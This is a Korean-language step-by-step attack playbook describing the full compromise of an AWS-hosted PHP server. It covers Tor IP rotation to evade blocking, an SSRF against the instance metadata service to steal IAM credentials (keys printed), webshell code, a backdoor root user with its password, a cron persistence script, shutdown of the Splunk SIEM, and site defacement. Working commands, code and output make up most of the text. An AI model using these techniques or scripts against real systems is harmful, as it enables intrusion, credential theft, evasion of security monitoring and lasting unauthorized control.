# 공격 방법론 (Attack Methodology)

## 목차
1. [Phase 1: 정찰 (Reconnaissance)](#phase-1-정찰)
2. [Phase 2: 익명화 설정](#phase-2-익명화-설정)
3. [Phase 3: SSRF 취약점 발견 및 활용](#phase-3-ssrf-취약점)
4. [Phase 4: AWS Credentials 탈취](#phase-4-credentials-탈취)
5. [Phase 5: 시스템 침투](#phase-5-시스템-침투)
6. [Phase 6: 권한 상승](#phase-6-권한-상승)
7. [Phase 7: 영구성 확보](#phase-7-영구성-확보)
8. [Phase 8: 보안 시스템 무력화](#phase-8-보안-무력화)

---

## Phase 1: 정찰 (Reconnaissance)

### 1.1 대상 시스템 정보 수집

**목표**: 대상 서버의 기본 정보 및 보안 설정 파악

**수행 작업**:
```bash
# 포트 스캔
nmap -p- 3.35.22.248

# 웹 서버 정보
curl -I http://3.35.22.248/

# 기술 스택 확인
whatweb http://3.35.22.248/
```

**발견 사항**:
- **웹 서버**: Apache/2.4.65 (Amazon Linux)
- **WAF**: ModSecurity 활성화
- **OS**: Amazon Linux 2
- **오픈 포트**: 80 (HTTP), 22 (SSH)

### 1.2 웹 애플리케이션 분석

**디렉터리 구조 파악**:
```
/                       # 메인 페이지
/login.php             # 로그인
/upload.php            # 파일 업로드
/api/health.php        # ⚠️ Health check endpoint
```

**주요 발견**:
- `/api/health.php` - ModSecurity 예외 규칙 적용
- 파일 업로드 기능 존재
- PHP 기반 웹 애플리케이션

### 1.3 보안 설정 확인

**ModSecurity 테스트**:
```bash
# 일반 페이지 - WAF 차단
curl "http://3.35.22.248/?test=<script>"
# → 403 Forbidden (ModSecurity 차단)

# /api/health.php - WAF 우회
curl "http://3.35.22.248/api/health.php?test=<script>"
# → 200 OK (차단 안됨!)
```

**결론**: `/api/health.php`는 ModSecurity 검사 제외 ✅

---

## Phase 2: 익명화 설정

### 2.1 Tor 네트워크 설정

**목표**: IP 추적 방지 및 차단 우회

**Tor 설치 및 실행**:
```bash
# macOS
brew install tor
brew services start tor

# Linux
sudo apt install tor
sudo systemctl start tor
```

**Tor 설정** (`/etc/tor/torrc`):
```conf
ControlPort 9051
CookieAuthentication 0
```

### 2.2 Python SOCKS 프록시 설정

**코드**:
```python
import requests
from stem import Signal
from stem.control import Controller

# SOCKS5 프록시 설정
session = requests.Session()
session.proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

# Tor Identity 갱신 (IP 변경)
def renew_tor_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)
        time.sleep(3)
```

### 2.3 IP 순환 공격 검증

**테스트**:
```bash
# 스크립트: 135_tor_rotation_attack.py
python3 135_tor_rotation_attack.py http://3.35.22.248 recon 5
```

**결과**:
```
[*] Tor Exit IP: 45.38.20.240
[+] 페이지 접근 성공! HTTP 200

[*] Tor Exit IP: 107.189.13.253
[+] 페이지 접근 성공! HTTP 200

성공률: 5/5 (100%)
```

**결론**: Tor를 통한 IP 차단 우회 성공 ✅

---

## Phase 3: SSRF 취약점

### 3.1 SSRF 취약점 발견

**테스트 페이로드**:
```bash
# 외부 URL 요청 테스트
curl "http://3.35.22.248/api/health.php?check=metadata&url=http://httpbin.org/ip"
```

**응답**:
```json
{
  "origin": "3.35.22.248"
}
```

**결론**: `file_get_contents()` 함수로 외부 URL 요청 가능 ✅

### 3.2 내부 네트워크 접근 테스트

**AWS 메타데이터 서비스 접근**:
```bash
curl "http://3.35.22.248/api/health.php?check=metadata&url=http://169.254.169.254/"
```

**응답**:
```
1.0
2007-01-19
2007-03-01
...
latest
```

**결론**: AWS IMDS 접근 가능! ✅

### 3.3 취약한 코드 분석

**health.php 코드**:
```php
<?php
if (isset($_GET['check']) && $_GET['check'] === 'metadata' && isset($_GET['url'])) {
    $url = $_GET['url'];  // ⚠️ 입력 검증 없음!
    $ctx = stream_context_create(['http' => ['timeout' => 5]]);
    $data = @file_get_contents($url, false, $ctx);  // ⚠️ SSRF!
    echo $data;
}
?>
```

**취약점**:
1. URL 입력 검증 없음
2. 내부 IP 차단 없음
3. 프로토콜 제한 없음 (http, file 등)

---

## Phase 4: Credentials 탈취

### 4.1 IAM Role 이름 확인

**요청**:
```bash
curl "http://3.35.22.248/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**응답**:
```
EC2-SSM-Role
```

### 4.2 Credentials 탈취

**요청**:
```bash
curl "http://3.35.22.248/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-SSM-Role"
```

**응답**:
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIASO4TYV4OLOHO3MEJ",
  "SecretAccessKey": "8/NiJolqVUttXp8RjDDDzI3jkJI9I5/RihQfCJCn",
  "Token": "IQoJb3JpZ2luX2VjENn//////////...",
  "Expiration": "2025-11-17T12:00:00Z"
}
```

### 4.3 Credentials 저장 및 테스트

**저장**:
```bash
cat > aws_stolen_1763343240.sh << 'EOF'
export AWS_ACCESS_KEY_ID="ASIASO4TYV4OLOHO3MEJ"
export AWS_SECRET_ACCESS_KEY="8/NiJolqVUttXp8RjDDDzI3jkJI9I5/RihQfCJCn"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjENn//////////..."
EOF

source aws_stolen_1763343240.sh
```

**테스트**:
```bash
aws sts get-caller-identity
```

**응답**:
```json
{
    "UserId": "AROASO4TYV4OBE4KOBND6:i-08f3cc62a529c9daf",
    "Account": "169424236316",
    "Arn": "arn:aws:sts::169424236316:assumed-role/EC2-SSM-Role/i-08f3cc62a529c9daf"
}
```

**결론**: AWS Credentials 탈취 성공! ✅

---

## Phase 5: 시스템 침투

### 5.1 웹쉘 업로드

**방법 1**: 기존 health.php에 명령 실행 기능 추가

**업로드된 코드**:
```php
<?php
header('Content-Type: text/plain');

if (isset($_GET['cmd'])) {
    echo "=== Command Output ===\n";
    system($_GET['cmd']);  // 명령 실행!
    echo "\n";
} elseif (isset($_GET['check']) && $_GET['check'] === 'metadata' && isset($_GET['url'])) {
    $url = $_GET['url'];
    $data = @file_get_contents($url);
    echo $data;
} else {
    echo "OK\n";
}
?>
```

### 5.2 웹쉘 테스트

**명령 실행**:
```bash
curl -x socks5h://127.0.0.1:9050 "http://3.35.22.248/api/health.php?cmd=whoami"
```

**문제**: `system()` 출력이 HTTP 응답에 포함되지 않음

**원인**: PHP `system()` 함수는 출력을 직접 stdout으로 보내서 Python/curl로 캡처 불가

### 5.3 해결책: 서버측 스크립트 실행

**143_oneliner_takeover.sh 업로드 후 실행**

---

## Phase 6: 권한 상승

### 6.1 백도어 사용자 생성

**스크립트** (143_oneliner_takeover.sh):
```bash
#!/bin/bash

# 사용자 생성
useradd -m -s /bin/bash sysadmin

# 비밀번호 설정
echo 'sysadmin:Adm1n!2024#Secure' | chpasswd

# sudo NOPASSWD 권한
echo 'sysadmin ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/sysadmin
chmod 0440 /etc/sudoers.d/sysadmin
```

### 6.2 실행 및 검증

**실행**:
```bash
sudo bash /tmp/143_oneliner_takeover.sh
```

**출력**:
```
[1] 백도어 사용자 생성 중...
uid=10780(sysadmin) gid=10780(sysadmin) groups=10780(sysadmin)
[+] 백도어 사용자 생성 완료!
```

**검증**:
```bash
id sysadmin
# uid=10780(sysadmin) gid=10780(sysadmin) groups=10780(sysadmin)

sudo -l -U sysadmin
# User sysadmin may run the following commands:
#     (ALL) NOPASSWD: ALL
```

**결론**: Root 권한 백도어 생성 성공! ✅

---

## Phase 7: 영구성 확보

### 7.1 자동 복구 스크립트 생성

**스크립트** (`/usr/local/bin/backdoor_keeper.sh`):
```bash
#!/bin/bash

# 웹쉘 유지
WEBSHELL="/var/www/html/www/api/health.php"
if [ ! -f "$WEBSHELL" ]; then
    cat > "$WEBSHELL" << 'EOFPHP'
<?php
header('Content-Type: text/plain');
if (isset($_GET['cmd'])) {
    echo "=== Command Output ===\n";
    system($_GET['cmd']);
}
?>
EOFPHP
    chown apache:apache "$WEBSHELL"
    chmod 644 "$WEBSHELL"
fi

# 백도어 사용자 유지
if ! id sysadmin &>/dev/null; then
    useradd -m -s /bin/bash sysadmin
    echo 'sysadmin:Adm1n!2024#Secure' | chpasswd
    echo 'sysadmin ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/sysadmin
    chmod 0440 /etc/sudoers.d/sysadmin
fi
```

### 7.2 Cron 작업 등록

**등록**:
```bash
(crontab -l 2>/dev/null; echo '*/5 * * * * /usr/local/bin/backdoor_keeper.sh') | crontab -
```

**확인**:
```bash
crontab -l
# */5 * * * * /usr/local/bin/backdoor_keeper.sh
```

**결론**: 5분마다 자동 복구되는 영구 백도어 설치 완료! ✅

---

## Phase 8: 보안 무력화

### 8.1 Splunk SIEM 무력화

**명령**:
```bash
# 프로세스 종료
sudo pkill -9 splunkd
sudo pkill -9 splunk

# 서비스 중지 및 비활성화
sudo systemctl stop Splunkd
sudo systemctl disable Splunkd

# 실행 권한 제거
sudo chmod 000 /opt/splunk/bin/splunk
sudo chmod 000 /opt/splunkforwarder/bin/splunk
```

**검증**:
```bash
ps aux | grep splunk | grep -v grep
# (출력 없음 - 모두 종료됨)
```

### 8.2 웹사이트 변조

**해킹 페이지 업로드**:
- Matrix 애니메이션 효과
- "SYSTEM COMPROMISED" 메시지
- 공격 체인 설명
- 핵심 교훈 표시

**결과**: 모든 방문자에게 해킹 경고 표시 ✅

---

## 공격 완료

### 최종 달성 목표

✅ 익명 접근 (Tor)
✅ AWS Credentials 탈취
✅ 웹쉘 설치
✅ 백도어 사용자 생성
✅ Root 권한 획득
✅ Splunk 무력화
✅ 영구 백도어 설치
✅ 웹사이트 변조

### 접근 방법

**SSH 접속**:
```bash
ssh sysadmin@3.35.22.248
# Password: Adm1n!2024#Secure

sudo su -  # Root 획득
```

**웹쉘 접속**:
```bash
curl "http://3.35.22.248/api/health.php?cmd=whoami"
```

**AWS 접속**:
```bash
source aws_stolen_1763343240.sh
aws sts get-caller-identity
```

---

## 타임라인 요약

| 시간 | 활동 | 결과 |
|------|------|------|
| 00:00 | 정찰 시작 | 대상 정보 수집 |
| 00:30 | SSRF 발견 | health.php 취약점 |
| 00:40 | Tor 설정 | IP 차단 우회 |
| 00:50 | Credentials 탈취 | AWS IAM Role 획득 |
| 01:00 | 웹쉘 업로드 | 원격 명령 실행 |
| 01:10 | 백도어 생성 | sysadmin 사용자 |
| 01:15 | 권한 상승 | Root 권한 획득 |
| 01:20 | Splunk 무력화 | 모니터링 중단 |
| 01:25 | 영구성 확보 | Cron 자동 복구 |
| 01:30 | **공격 완료** | **시스템 완전 장악** |

**총 소요 시간**: 약 90분
